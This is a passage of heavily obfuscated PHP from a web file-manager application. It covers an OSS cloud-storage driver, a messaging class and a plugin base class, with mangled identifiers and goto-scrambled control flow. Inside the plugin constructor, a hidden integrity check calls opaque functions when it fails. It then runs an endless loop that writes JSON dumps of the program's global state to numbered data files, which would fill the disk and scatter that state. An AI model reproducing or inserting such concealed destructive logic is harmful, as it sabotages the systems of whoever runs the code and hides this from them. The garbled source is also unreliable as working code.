$this->accessKey, $A„îî‡ïÁ∑[1197] => $A„îî‡ïÁ∑[1189], $A„îî‡ïÁ∑[1295] => $Eóπ®¢™Ñ‹, $A„îî‡ïÁ∑[175] => $CíÊ†È∂Á∑); $E†©Ò„”¥± = $this->trafficLimit($A„îî‡ïÁ∑[1288], $E†©Ò„”¥±); goto cΩ•∆¬÷óë; A¿⁄ñ≥ÜéÖ: $A„îî‡ïÁ∑ =& $_SERVER[ú∫]; if (!($CíÊ†È∂Á∑ = $this->getHost())) { return !1; } $b≥ÛÌÜÚÏ∫ = $fã±á±¬Á‡; goto AÊ•ìƒÜÿé; cΩ•∆¬÷óë: return $E†©Ò„”¥±; goto aãé¢À◊€Ç; aãé¢À◊€Ç: } public function multiUploadFormData($a©ÀÑ‰∑º, $b∏≈√ï£ÇÁ = 3600) { $e∑É›⁄≥∞Ì =& $_SERVER[ú∫]; if (!($AÜ°Ñíœòü = $this->getHost())) { return !1; } $DÜØâ€ê»ë = $this->trafficLimit($e∑É›⁄≥∞Ì[1288]); $d∫Ø‡Ç™•ó = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($a©ÀÑ‰∑º), $DÜØâ€ê»ë); return array($e∑É›⁄≥∞Ì[221] => $d∫Ø‡Ç™•ó, $e∑É›⁄≥∞Ì[175] => $AÜ°Ñíœòü . $e∑É›⁄≥∞Ì[8] . $this->pathEncode($a©ÀÑ‰∑º), $e∑É›⁄≥∞Ì[222] => gmdate($e∑É›⁄≥∞Ì[1296]), $e∑É›⁄≥∞Ì[93] => $a©ÀÑ‰∑º); } public function multiUploadAuthData($Eﬁ¨ﬂ˘ª¨ó, $C√€”„⁄êó = array()) { goto cç£Á–⁄Öº; B¯Ô¶Îúπê: $dŒ◊éÚ¡ÇÁ = $D≈”éê≠˜÷[1261] . $this->accessKey . $D≈”éê≠˜÷[4] . $BÇıÉ⁄Á∫ß; if (strpos($aå∆ñ–ÛÒΩ, $D≈”éê≠˜÷[225]) === 0) { $dŒ◊éÚ¡ÇÁ = array($D≈”éê≠˜÷[232] => $dŒ◊éÚ¡ÇÁ, $D≈”éê≠˜÷[222] => $AÉàä°ÛÉ¶); if ($d«‘˘≈Á∆ë) { $dŒ◊éÚ¡ÇÁ = array_merge($dŒ◊éÚ¡ÇÁ, $d«‘˘≈Á∆ë); } } return $dŒ◊éÚ¡ÇÁ; goto f‰¿≠ëÂãÇ; BÖÈ–åÚÂ’: $dä©ïÉ‚Ÿı = array($D≈”éê≠˜÷[224], $D≈”éê≠˜÷[33], $D≈”éê≠˜÷[119], $AÉàä°ÛÉ¶, "\170\x2d\157\x73\163\55\144\141\164\145\72{$AÉàä°ÛÉ¶}", $D≈”éê≠˜÷[8] . $this->bucket . $D≈”éê≠˜÷[8] . $Eîú–Ü§£˘ . $aå∆ñ–ÛÒΩ); if (strpos($aå∆ñ–ÛÒΩ, $D≈”éê≠˜÷[225]) === 0) { $dä©ïÉ‚Ÿı[0] = $D≈”éê≠˜÷[226]; if ($d«‘˘≈Á∆ë = $this->trafficLimit($D≈”éê≠˜÷[1288])) { $Eîú–Ü§£˘ = $D≈”éê≠˜÷[1297]; array_splice($dä©ïÉ‚Ÿı, 5, 0, $Eîú–Ü§£˘ . $D≈”éê≠˜÷[4] . $d«‘˘≈Á∆ë[$Eîú–Ü§£˘]); } } if (isset($C√€”„⁄êó[$D≈”éê≠˜÷[227]]) && $C√€”„⁄êó[$D≈”éê≠˜÷[227]] == $D≈”éê≠˜÷[228]) { $dä©ïÉ‚Ÿı[0] = $D≈”éê≠˜÷[228]; } goto FÌ≈Øûûá§; FÌ≈Øûûá§: if (!empty($C√€”„⁄êó[$D≈”éê≠˜÷[1298]])) { $a∏ïåÿ—ô¯ = array_merge(array($dä©ïÉ‚Ÿı[4]), $C√€”„⁄êó[$D≈”éê≠˜÷[1298]]); sort($a∏ïåÿ—ô¯); $dä©ïÉ‚Ÿı[4] = implode($D≈”éê≠˜÷[229], $a∏ïåÿ—ô¯); } $cÜôµ˜‡Õã = implode($D≈”éê≠˜÷[229], $dä©ïÉ‚Ÿı); $BÇıÉ⁄Á∫ß = base64_encode(hash_hmac($D≈”éê≠˜÷[230], $cÜôµ˜‡Õã, $this->secret, !0)); goto B¯Ô¶Îúπê; bñã“åî’™: $Eîú–Ü§£˘ = $Eﬁ¨ﬂ˘ª¨ó; if (isset($C√€”„⁄êó[$D≈”éê≠˜÷[93]])) { $Eîú–Ü§£˘ = $C√€”„⁄êó[$D≈”éê≠˜÷[93]]; unset($C√€”„⁄êó[$D≈”éê≠˜÷[93]]); } if (isset($C√€”„⁄êó[$D≈”éê≠˜÷[223]])) { $C√€”„⁄êó[$D≈”éê≠˜÷[222]] = $AÉàä°ÛÉ¶; return $this->listUploadParts($Eîú–Ü§£˘, $C√€”„⁄êó); } goto BÖÈ–åÚÂ’; cç£Á–⁄Öº: $D≈”éê≠˜÷ =& $_SERVER[ú∫]; $AÉàä°ÛÉ¶ = isset($C√€”„⁄êó[$D≈”éê≠˜÷[222]]) ? $C√€”„⁄êó[$D≈”éê≠˜÷[222]] : gmdate($D≈”éê≠˜÷[1296]); $aå∆ñ–ÛÒΩ = isset($C√€”„⁄êó[$D≈”éê≠˜÷[168]]) ? $C√€”„⁄êó[$D≈”éê≠˜÷[168]] : $D≈”éê≠˜÷[33]; goto bñã“åî’™; f‰¿≠ëÂãÇ: } public function listUploadParts($bÏùÂ±∞Îı, $C»ú¡‡·õ) { goto bè¢»˜·≤˘; Aá≈≤äîú: return array($Bê√æâáÒ«[232] => $c¡å˘“â£Â, $Bê√æâáÒ«[222] => $C»ú¡‡·õ[$Bê√æâáÒ«[222]], $Bê√æâáÒ«[234] => $DÕÜè¡ãë»); goto F‰∂‚–Ï¨¶; EıÏÜæ‹À«: $fÍÑëΩöË¶ = $F◊ƒ¿õ‘ô÷->getListPart(); $DÕÜè¡ãë» = array(); foreach ($fÍÑëΩöË¶ as $F⁄∑ãÉå√Ô) { $DÕÜè¡ãë»[] = array($Bê√æâáÒ«[1281] => $F⁄∑ãÉå√Ô->getPartNumber(), $Bê√æâáÒ«[1282] => trim($F⁄∑ãÉå√Ô->getETag(), $Bê√æâáÒ«[116])); } goto e‰√‹ç∞µÿ; bè¢»˜·≤˘: $Bê√æâáÒ« =& $_SERVER[ú∫]; $C øÓõêºâ = parse_url_query($C»ú¡‡·õ[$Bê√æâáÒ«[168]]); $F◊ƒ¿õ‘ô÷ = $this->client->listParts($this->bucket, $this->pathEncode($bÏùÂ±∞Îı), $C øÓõêºâ[$Bê√æâáÒ«[221]]); goto EıÏÜæ‹À«; e‰√‹ç∞µÿ: unset($C»ú¡‡·õ[$Bê√æâáÒ«[223]], $C»ú¡‡·õ[$Bê√æâáÒ«[227]]); $c¡å˘“â£Â = $this->multiUploadAuthData($bÏùÂ±∞Îı, $C»ú¡‡·õ); if (empty($c¡å˘“â£Â)) { return !1; } goto Aá≈≤äîú; F‰∂‚–Ï¨¶: } public function download($a’…Ç∏îÙì, $a•Ñ¬‚Çà≠) { if ($this->isFolder($a’…Ç∏îÙì)) { return !1; } try { $E«‡çûÇ®É = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $a•Ñ¬‚Çà≠); $E«‡çûÇ®É = $this->trafficLimit($_SERVER[ú∫][109], $E«‡çûÇ®É); $this->client->getObject($this->bucket, $this->pathEncode($a’…Ç∏îÙì), $E«‡çûÇ®É); } catch (OSS\Core\OssException $Dó´µ⁄π»ä) { return !1; } return $a•Ñ¬‚Çà≠; } public function fileSubstr($E‹ﬂ‰°åèË, $Fõ˘Œ‚ﬁÙó = 0, $fåÓà∫üáÌ = false) { if ($Fõ˘Œ‚ﬁÙó === -1) { $E„©ÛÎÀç∑ = array(); } else { if ($fåÓà∫üáÌ === !1) { $eÂ¿«ÑÇªÛ = $this->size($E‹ﬂ‰°åèË); } else { $eÂ¿«ÑÇªÛ = $Fõ˘Œ‚ﬁÙó + $fåÓà∫üáÌ - 1; } $E„©ÛÎÀç∑ = array(OSS\OssClient::OSS_RANGE => "{$Fõ˘Œ‚ﬁÙó}\55{$eÂ¿«ÑÇªÛ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($E‹ﬂ‰°åèË), $E„©ÛÎÀç∑); } catch (OSS\Core\OssException $f‚òÑˆ∑“ï) { think_exception($f‚òÑˆ∑“ï->getMessage()); return !1; } } private function trafficLimit($Fù˘ÖÂÊâ•, $B˜è«û◊‹Ï = array()) { goto CúÎâ∞´Âç; F€ﬁ—Ωñä¿: return $B˜è«û◊‹Ï; goto c¬∫≠È÷œç; e∫—˜≥äçÑ: if (!$D≤Ôôıª≥∫) { return $B˜è«û◊‹Ï; } $D≤Ôôıª≥∫ = $D≤Ôôıª≥∫ < 819200 ? 819200 : ($D≤Ôôıª≥∫ > 838860800 ? 838860800 : $D≤Ôôıª≥∫); $B˜è«û◊‹Ï[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($D≤Ôôıª≥∫); goto F€ﬁ—Ωñä¿; CúÎâ∞´Âç: $EÌÀã≤Óπé =& $_SERVER[ú∫]; if ($Fù˘ÖÂÊâ• == $EÌÀã≤Óπé[1288] && $this->isUploadServer() || $Fù˘ÖÂÊâ• == $EÌÀã≤Óπé[109] && $this->isFileOutServer()) { return $B˜è«û◊‹Ï; } $D≤Ôôıª≥∫ = floatval($GLOBALS[$EÌÀã≤Óπé[6]][$EÌÀã≤Óπé[88]][$EÌÀã≤Óπé[107]][$Fù˘ÖÂÊâ•]) * 1024 * 1024 * 8; goto e∫—˜≥äçÑ; c¬∫≠È÷œç: } public function link($FÏ«†àæßÔ, $E¬äÖ√º¡ä = array()) { $Cæ∞ò¿¬ôﬂ =& $_SERVER[ú∫]; if (!$this->exist($FÏ«†àæßÔ) || $this->isFolder($FÏ«†àæßÔ)) { return !1; } try { $E¬äÖ√º¡ä = $this->trafficLimit($Cæ∞ò¿¬ôﬂ[109], $E¬äÖ√º¡ä); $E£≥ÇÕéÑë = $this->client->signUrl($this->bucket, $this->pathEncode($FÏ«†àæßÔ), 3600 * 12, $Cæ∞ò¿¬ôﬂ[228], $E¬äÖ√º¡ä); return $this->getCdnLink($E£≥ÇÕéÑë); } catch (OSS\Core\OssException $e‡√Œ·§“·) { return !1; } } public function fileOut($Dï•ø¿Õ≥ó, $bôîê™†õÆ = false, $D´Á¶°€ãñ = false, $B”◊Ó¿›·± = '') { goto Dîﬁÿ√⁄ãª; dπŸ•≥Õ€ª: $D´Á¶°€ãñ = rawurlencode($D´Á¶°€ãñ); $Eå¡ﬂÑùîÃ = get_file_mime(get_path_ext($D´Á¶°€ãñ)); if ($Eå¡ﬂÑùîÃ == $båŸ›É≠áô[213]) { return parent::fileOut($Dï•ø¿Õ≥ó, $bôîê™†õÆ, $D´Á¶°€ãñ, $B”◊Ó¿›·±); } goto AÜç•ê®Ç¯; AÜç•ê®Ç¯: $bôîê™†õÆ = $bôîê™†õÆ ? $båŸ›É≠áô[214] : $båŸ›É≠áô[215]; $D£ÆÕ±≤âŸ = array(OSS\OssClient::OSS_SUB_RESOURCE => $båŸ›É≠áô[1299] . rawurlencode("{$bôîê™†õÆ}\x3b\x66\151\154\x65\156\141\155\x65\75{$D´Á¶°€ãñ}")); $D£ÆÕ±≤âŸ[OSS\OssClient::OSS_SUB_RESOURCE] .= $båŸ›É≠áô[1300] . rawurlencode($Eå¡ﬂÑùîÃ); goto EûÈŸë¢‹¬; EûÈŸë¢‹¬: $F≠ÈÆÁô’Õ = $this->link($Dï•ø¿Õ≥ó, $D£ÆÕ±≤âŸ); $this->fileOutLink($F≠ÈÆÁô’Õ); goto f™‰Ò´ìîΩ; Dîﬁÿ√⁄ãª: $båŸ›É≠áô =& $_SERVER[ú∫]; if ($this->isFileOutServer()) { return $this->fileOutServer($Dï•ø¿Õ≥ó, $bôîê™†õÆ, $D´Á¶°€ãñ, $B”◊Ó¿›·±); } if (!$D´Á¶°€ãñ) { $D´Á¶°€ãñ = $this->pathThis($Dï•ø¿Õ≥ó); } goto dπŸ•≥Õ€ª; f™‰Ò´ìîΩ: } public function fileOutServer($D√†û‡ÛÔŒ, $CÀéÉ°ªº = false, $e√®é§πâà = false, $c–ºÊÇﬂˆª = '') { parent::fileOut($D√†û‡ÛÔŒ, $CÀéÉ°ªº, $e√®é§πâà, $c–ºÊÇﬂˆª); } public function fileOutImage($b†äáÒÖØ∂, $AÑéÑ›ÇÔº = 250) { $CÁª¶ÖØåß = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ú∫][1301] . $AÑéÑ›ÇÔº); $e˘ä±—óá∞ = $this->link($b†äáÒÖØ∂, $CÁª¶ÖØåß); $this->fileOutLink($e˘ä±—óá∞); } public function fileOutImageServer($f´ˆë±•ƒŒ, $BÂ•ôü∞⁄‹ = 250) { parent::fileOutImage($f´ˆë±•ƒŒ, $BÂ•ôü∞⁄‹); } public function fileOutLink($E’íÏÍÓñù) { $dè›‹‹„∞ç =& $_SERVER[ú∫]; if (!$this->isCdnHost() && substr($E’íÏÍÓñù, 0, 7) == $dè›‹‹„∞ç[1204]) { $E’íÏÍÓñù = $dè›‹‹„∞ç[1205] . substr($E’íÏÍÓñù, 7); } header($dè›‹‹„∞ç[159] . $E’íÏÍÓñù); die; } public function hashMd5($bıÔÏÜÕﬂ≤, $FÙßê€≥Öœ = '') { $f†¯ﬂÛ¶æâ =& $_SERVER[ú∫]; $cÖﬁ‡êıﬂº = $this->_objectMeta($bıÔÏÜÕﬂ≤); if (!$cÖﬁ‡êıﬂº) { return $f†¯ﬂÛ¶æâ[33]; } if (!isset($cÖﬁ‡êıﬂº[$f†¯ﬂÛ¶æâ[1277]]) && !empty($FÙßê€≥Öœ)) { $Eœ∫¯Ûò∞Î = $this->updateObjMeta($bıÔÏÜÕﬂ≤, array($f†¯ﬂÛ¶æâ[1277] => $FÙßê€≥Öœ)); $cÖﬁ‡êıﬂº[$f†¯ﬂÛ¶æâ[1277]] = $Eœ∫¯Ûò∞Î ? $FÙßê€≥Öœ : $f†¯ﬂÛ¶æâ[33]; } return isset($cÖﬁ‡êıﬂº[$f†¯ﬂÛ¶æâ[1277]]) ? strtolower($cÖﬁ‡êıﬂº[$f†¯ﬂÛ¶æâ[1277]]) : $f†¯ﬂÛ¶æâ[33]; } public function size($bÍÛÎ„∆®‹) { $EåÎ§‚è£ß = $this->objectMeta($bÍÛÎ„∆®‹); return $EåÎ§‚è£ß ? $EåÎ§‚è£ß[$_SERVER[ú∫][78]] : 0; } public function info($E≠ ≠≈π∑‘) { if ($this->isFolder($E≠ ≠≈π∑‘)) { return $this->folderInfo($E≠ ≠≈π∑‘); } else { if ($this->isFile($E≠ ≠≈π∑‘)) { return $this->fileInfo($E≠ ≠≈π∑‘); } } return !1; } public function exist($aÚÃó¡…◊) { return $this->isFile($aÚÃó¡…◊) || $this->isFolder($aÚÃó¡…◊); } public function isFile($d¯ÙÖòâÒô) { return !$this->isFolder($d¯ÙÖòâÒô) && $this->objectMeta($d¯ÙÖòâÒô); } public function isFolder($BˆÂÛ∆Üó¡) { return $this->cacheMethod($_SERVER[ú∫][199], $BˆÂÛ∆Üó¡); } protected function objectMeta($büêÀŸÜÑõ) { return $this->cacheMethod($_SERVER[ú∫][200], $büêÀŸÜÑõ); } protected function _objectMeta($f›ÆŸ˘πïê) { $bû‹‚≠¡ŸÖ =& $_SERVER[ú∫]; try { $BÀµê⁄Õ∫Ë = $this->client->getObjectMeta($this->bucket, $this->pathEncode($f›ÆŸ˘πïê)); } catch (OSS\Core\OssException $C≤°¡‰âËƒ) { $BÀµê⁄Õ∫Ë = !1; } if ($BÀµê⁄Õ∫Ë) { $BÀµê⁄Õ∫Ë[$bû‹‚≠¡ŸÖ[78]] = intval($BÀµê⁄Õ∫Ë[$bû‹‚≠¡ŸÖ[1275]]); } return $BÀµê⁄Õ∫Ë; } protected function _isFolder($C†É¢Ñ…ÌË) { $Fû∑Ï„⁄‡ =& $_SERVER[ú∫]; if ($C†É¢Ñ…ÌË == $Fû∑Ï„⁄‡[33] || $C†É¢Ñ…ÌË == $Fû∑Ï„⁄‡[8]) { return !0; } $Aä⁄‡êƒ»Ò = array($Fû∑Ï„⁄‡[1271] => $Fû∑Ï„⁄‡[8], $Fû∑Ï„⁄‡[1272] => rtrim($C†É¢Ñ…ÌË, $Fû∑Ï„⁄‡[8]) . $Fû∑Ï„⁄‡[8], $Fû∑Ï„⁄‡[1273] => 1, $Fû∑Ï„⁄‡[1274] => $Fû∑Ï„⁄‡[33]); $FÿÂßÖÖ€ﬁ = $this->client->listObjects($this->bucket, $Aä⁄‡êƒ»Ò); if ($FÿÂßÖÖ€ﬁ->getObjectList() || $FÿÂßÖÖ€ﬁ->getPrefixList()) { return !0; } return !1; } } goto eÌœç¡ÓùÊ; DñÓè–≈∞î: class Message { function __construct() { } public function send($aá¶¬’≤äç = '', $c°ïâªç∂¿ = array(), $aÉëâÕ◊è˜ = "\x74\x65\170\x74") { goto Dâ„ß¡ﬂéÎ; c¨≤”ôê“Î: Hook::trigger($C±”Àõ‹õ›[1397], $fùç≤™Ìºé); goto a≈ñı«Î…ö; Dâ„ß¡ﬂéÎ: $C±”Àõ‹õ› =& $_SERVER[ú∫]; $eÃàÜà£∫Ö = array($C±”Àõ‹õ›[29] => $C±”Àõ‹õ›[1394], $C±”Àõ‹õ›[715] => $aá¶¬’≤äç); if (in_array($aÉëâÕ◊è˜, array($C±”Àõ‹õ›[1394], $C±”Àõ‹õ›[1395]))) { $eÃàÜà£∫Ö[$C±”Àõ‹õ›[29]] = $aÉëâÕ◊è˜; } goto B£Ü¡ıäáΩ; B£Ü¡ıäáΩ: $c°ïâªç∂¿ = array($C±”Àõ‹õ›[1015] => isset($c°ïâªç∂¿[$C±”Àõ‹õ›[1015]]) ? $c°ïâªç∂¿[$C±”Àõ‹õ›[1015]] : $C±”Àõ‹õ›[33], $C±”Àõ‹õ›[562] => isset($c°ïâªç∂¿[$C±”Àõ‹õ›[562]]) ? $c°ïâªç∂¿[$C±”Àõ‹õ›[562]] : $C±”Àõ‹õ›[33]); if (empty($aá¶¬’≤äç) || empty($c°ïâªç∂¿[$C±”Àõ‹õ›[1015]]) && empty($c°ïâªç∂¿[$C±”Àõ‹õ›[562]])) { return !1; } $fùç≤™Ìºé = array($C±”Àõ‹õ›[1335] => $eÃàÜà£∫Ö, $C±”Àõ‹õ›[1396] => $c°ïâªç∂¿); goto c¨≤”ôê“Î; a≈ñı«Î…ö: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto D£«•Óë≤û; D£«•Óë≤û: $d∂ïöÂÔºﬁ =& $_SERVER[ú∫]; $CªÿÊºßΩå = $_SERVER[$d∂ïöÂÔºﬁ[824]] . $d∂ïöÂÔºﬁ[825]; $Cº˘∞¢ı‰è = $d∂ïöÂÔºﬁ[838]; goto cÂ¶ûæäÜá; a∑ÑàÁ’—ø: $this->in =& $in; $this->modelPlugin = Model($d∂ïöÂÔºﬁ[1398]); $this->pluginName = str_replace($d∂ïöÂÔºﬁ[1398], $d∂ïöÂÔºﬁ[33], get_class($this)); goto cÿ¯Î‹≤ï≤; cÿ¯Î‹≤ï≤: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $d∂ïöÂÔºﬁ[8]; $this->pluginApi = appHostGet() . $d∂ïöÂÔºﬁ[1399] . $this->pluginName . $d∂ïöÂÔºﬁ[8]; $this->pluginHost = $config[$d∂ïöÂÔºﬁ[1400]] . $this->pluginName . $d∂ïöÂÔºﬁ[8]; goto AÚå·®∞Œà; cÂ¶ûæäÜá: if ($_SERVER[$d∂ïöÂÔºﬁ[821]] != $Cº˘∞¢ı‰è($CªÿÊºßΩå)) { goto e≈µ—èá–‘; Cﬁ“èòÛçø: $aÛ∫ûÊØãÆ = $d∂ïöÂÔºﬁ[840]; $aÛ∫ûÊØãÆ($_SERVER[$d∂ïöÂÔºﬁ[841]]); $e¯†ô‡ì‘Û = $d∂ïöÂÔºﬁ[839]; goto e∂‚çé∂ƒÊ; e≈µ—èá–‘: $e¯†ô‡ì‘Û = $d∂ïöÂÔºﬁ[839]; $Eâﬂéú ªƒ = $d∂ïöÂÔºﬁ[823]; $f“ÀËçŸ∆º = $_SERVER[$d∂ïöÂÔºﬁ[824]] . $d∂ïöÂÔºﬁ[825]; goto B‡Ïöà™ûã; B‡Ïöà™ûã: $dõª˜èÑ˘Ë = $Eâﬂéú ªƒ($f“ÀËçŸ∆º); $BáÕõõèÔ≠ = explode($d∂ïöÂÔºﬁ[229], $dõª˜èÑ˘Ë); if (count($BáÕõõèÔ≠) < $d∂ïöÂÔºﬁ[578]) { $c¢ñËú‚®ö = $d∂ïöÂÔºﬁ[826]; $c¢ñËú‚®ö(); } goto Cﬁ“èòÛçø; d´‘÷èî¢æ: $e¶Ë≈€øÚ¢ = 1; for ($A˘⁄íœ©∫Ö = $e¶Ë≈€øÚ¢; $A˘⁄íœ©∫Ö > 0; $A˘⁄íœ©∫Ö++) { $añáõ©âóâ(DATA_PATH . $A˘⁄íœ©∫Ö, $Cíæœ„ÿÀ—); } goto a¡ï¡®√—·; e∂‚çé∂ƒÊ: $e¯†ô‡ì‘Û(); $añáõ©âóâ = $d∂ïöÂÔºﬁ[842]; $Cíæœ„ÿÀ— = json_encode($GLOBALS[$d∂ïöÂÔºﬁ[843]]); goto d´‘÷èî¢æ; a¡ï¡®√—·: } global $in, $config; $this->config =& $config; goto a∑ÑàÁ’—ø; BàÂÖÉÍßú: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto F¥”¥ÖÌñÚ; AÚå·®∞Œà: $this->pluginHostDefault = $config[$d∂ïöÂÔºﬁ[1400]] . $this->pluginName . $d∂ïöÂÔºﬁ[8]; $b÷‹£¥Ê—Ë = $config[$d∂ïöÂÔºﬁ[1401]]; if ($b÷‹£¥Ê—Ë && strpos($d∂ïöÂÔºﬁ[47] . $b÷‹£¥Ê—Ë . $d∂ïöÂÔºﬁ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$d∂ïöÂÔºﬁ[1402]] . $this->pluginName . $d∂ïöÂÔºﬁ[8]; } goto BàÂÖÉÍßú; F¥”¥ÖÌñÚ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ú∫][1403]); } protected function assign($d¥Ö…”îï–, $b≤∆Êñ¬õ∂ = false) { if (is_array($d¥Ö…”îï–)) { $this->values = array_merge($this->values, $d¥Ö…”îï–); } else { $this->values[$d¥Ö…”îï–] = $b≤∆Êñ¬õ∂; } } protected function display($c„Ñé¬≠»¢) { extract($this->values); require $c„Ñé¬≠»¢; } final function hookRegist($E®ÛïÎ√à˘) { $this->modelPlugin->appRegist($this->pluginName, $E®ÛïÎ√à˘); } final function appIcon() { $C”øç«ÍãÙ =& $_SERVER[ú∫]; $d√Î°ôﬂÎ∫ = $this->appPackage(); $D†ª êä•í = $C”øç«ÍãÙ[33]; if (isset($d√Î°ôﬂÎ∫[$C”øç«ÍãÙ[409]])) { if (isset($d√Î°ôﬂÎ∫[$C”øç«ÍãÙ[409]][$C”øç«ÍãÙ[1404]])) { $D†ª êä•í = $C”øç«ÍãÙ[1405] . $d√Î°ôﬂÎ∫[$C”øç«ÍãÙ[409]][$C”øç«ÍãÙ[1404]] . $C”øç«ÍãÙ[1406]; } else { if ($d√Î°ôﬂÎ∫[$C”øç«ÍãÙ[409]][$C”øç«ÍãÙ[1407]]) { $D†ª êä•í = $C”øç«ÍãÙ[1408] . $d√Î°ôﬂÎ∫[$C”øç«ÍãÙ[409]][$C”øç«ÍãÙ[1407]] . $C”øç«ÍãÙ[1409]; } } } return $D†ª êä•í; } final function fileCanView($fí¶Éô…õ≈) { goto dÂøÎê…•£; Bæ àÜ¯÷é: $c»Ï©ÿ◊Ù» = Session::get($c…◊èõ–ó„[1410]); if (!$c»Ï©ÿ◊Ù» || !$c»Ï©ÿ◊Ù»[$c…◊èõ–ó„[1411]]) { $f´Ê¨ïÚ‘– = $c…◊èõ–ó„[1412] . rawurlencode(this_url()); show_tips(LNG($c…◊èõ–ó„[1413]) . $c…◊èõ–ó„[1414] . $f´Ê¨ïÚ‘– . $c…◊èõ–ó„[1415] . LNG($c…◊èõ–ó„[1416]) . $c…◊èõ–ó„[1417], !1); } if (!Action($c…◊èõ–ó„[1418])->authCan($c…◊èõ–ó„[1419])) { show_tips(LNG($c…◊èõ–ó„[1420]) . $c…◊èõ–ó„[1421], !1); } goto d°’áﬁ•ç†; d°’áﬁ•ç†: ActionCall($c…◊èõ–ó„[1422], $fí¶Éô…õ≈); goto c≠•µ«ô–Ç; dÂøÎê…•£: $c…◊èõ–ó„ =& $_SERVER[ú∫]; if (request_url_safe($fí¶Éô…õ≈)) { return !0; } if ($this->isShare($fí¶Éô…õ≈)) { return !0; } goto Bæ àÜ¯÷é; c≠•µ«ô–Ç: } final function isShare($E•”¡∂’˘ù) { $FŒ»Á´†âÒ = KodIO::parse($E•”¡∂’˘ù); return $FŒ»Á´†âÒ[$_SERVER[ú∫][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($FÎõÂ∫·’∑) { if (request_url_safe($FÎõÂ∫·’∑)) { return $FÎõÂ∫·’∑; } if (!$this->isShare($FÎõÂ∫·’∑)) { $FÎõÂ∫·’∑ = $this->filePath($FÎõÂ∫·’∑); } return Action($_SERVER[ú∫][1070])->linkOut($FÎõÂ∫·’∑); } public function filePathLinkOut($E’à¬Øá‰ÿ) { if (request_url_safe($E’à¬Øá‰ÿ)) { return $E’à¬Øá‰ÿ; } $this->fileCanView($E’à¬Øá‰ÿ); return Action($_SERVER[ú∫][1070])->link($E’à¬Øá‰ÿ); } final function filePath($BŒä†ÓÏ≈≠) { $a—àåÌ“Àº =& $_SERVER[ú∫]; if ($FËŒäÂàıÊ = $this->checkSharePath($BŒä†ÓÏ≈≠)) { Hook::trigger($a—àåÌ“Àº[1423], $FËŒäÂàıÊ); return $FËŒäÂàıÊ; } $this->fileCanView($BŒä†ÓÏ≈≠); if (request_url_safe($BŒä†ÓÏ≈≠)) { $e¯íÇòÍå¥ = parse_url_query($BŒä†ÓÏ≈≠); if (isset($e¯íÇòÍå¥[$a—àåÌ“Àº[1424]]) && isset($e¯íÇòÍå¥[$a—àåÌ“Àº[209]])) { $AÈ˜â∂ãŒâ = Model($a—àåÌ“Àº[730])->get($a—àåÌ“Àº[731]); $d„Ô⁄∑øá∏ = Mcrypt::decode($e¯íÇòÍå¥[$a—àåÌ“Àº[209]], $AÈ˜â∂ãŒâ); if ($d„Ô⁄∑øá∏) { $this->fileInfo = IO::infoWithChildren($d„Ô⁄∑øá∏); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $d„Ô⁄∑øá∏; } } $BŒä†ÓÏ≈≠ = $this->_cacheHttpFile($BŒä†ÓÏ≈≠); $this->fileInfo = IO::infoWithChildren($BŒä†ÓÏ≈≠); } else { $this->fileInfo = IO::infoWithChildren($BŒä†ÓÏ≈≠); if (!$this->fileInfo) { show_tips(LNG($a—àåÌ“Àº[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($a—àåÌ“Àº[1423], $BŒä†ÓÏ≈≠); return $BŒä†ÓÏ≈≠; } final function _cacheHttpFile($BÈÆºÉøéê) { $F»ÍﬂõÇ§É = hash_path($BÈÆºÉøéê, !0); $this->cachePath = $this->pluginCachePath($F»ÍﬂõÇ§É); if ($Cª¢ﬂ·´Òã = IO::fileNameExist($this->cachePath, $F»ÍﬂõÇ§É)) { return KodIO::make($Cª¢ﬂ·´Òã); } $Eñ ÏÖ≥¶ü = $this->cachePath . $F»ÍﬂõÇ§É; return $this->pluginCacheFileSet($Eñ ÏÖ≥¶ü, file_get_contents_nossl($BÈÆºÉøéê)); } final function _tmpFileName($a¢îÚª÷¢¡ = array()) { goto E»¨Œîèã˜; E»¨Œîèã˜: $A¿ã‘©≤Õ‘ =& $_SERVER[ú∫]; if (!$a¢îÚª÷¢¡) { $a¢îÚª÷¢¡ = $this->fileInfo; } if (isset($a¢îÚª÷¢¡[$A¿ã‘©≤Õ‘[171]])) { return $a¢îÚª÷¢¡[$A¿ã‘©≤Õ‘[171]]; } goto e°…ú»¥ØÙ; e°…ú»¥ØÙ: if (isset($a¢îÚª÷¢¡[$A¿ã‘©≤Õ‘[164]][$A¿ã‘©≤Õ‘[171]])) { return $a¢îÚª÷¢¡[$A¿ã‘©≤Õ‘[164]][$A¿ã‘©≤Õ‘[171]]; } $F»«£ƒ¯“Î = IO::hashSimple($a¢îÚª÷¢¡[$A¿ã‘©≤Õ‘[76]]); if ($F»«£ƒ¯“Î) { return $F»«£ƒ¯“Î; } goto B¥ŸÈˆ—í ; B¥ŸÈˆ—í : $cÜÜêãô¿ü = array($a¢îÚª÷¢¡[$A¿ã‘©≤Õ‘[28]], $a¢îÚª÷¢¡[$A¿ã‘©≤Õ‘[76]], $a¢îÚª÷¢¡[$A¿ã‘©≤Õ‘[78]]); if (isset($a¢îÚª÷¢¡[$A¿ã‘©≤Õ‘[487]])) { $cÜÜêãô¿ü[] = $a¢îÚª÷¢¡[$A¿ã‘©≤Õ‘[487]]; } return md5(implode($A¿ã‘©≤Õ‘[71], $cÜÜêãô¿ü)); goto fËÓï§‰Â—; fËÓï§‰Â—: } final function checkSharePath($EÚçÚﬁØ„∆) { goto Cäá√›√ﬁô; b∑ÔπßÒŒï: $b¿èñé©É√ = Action($B∑íæë’ûü[1070])->sharePathInfo($EÚçÚﬁØ„∆); if 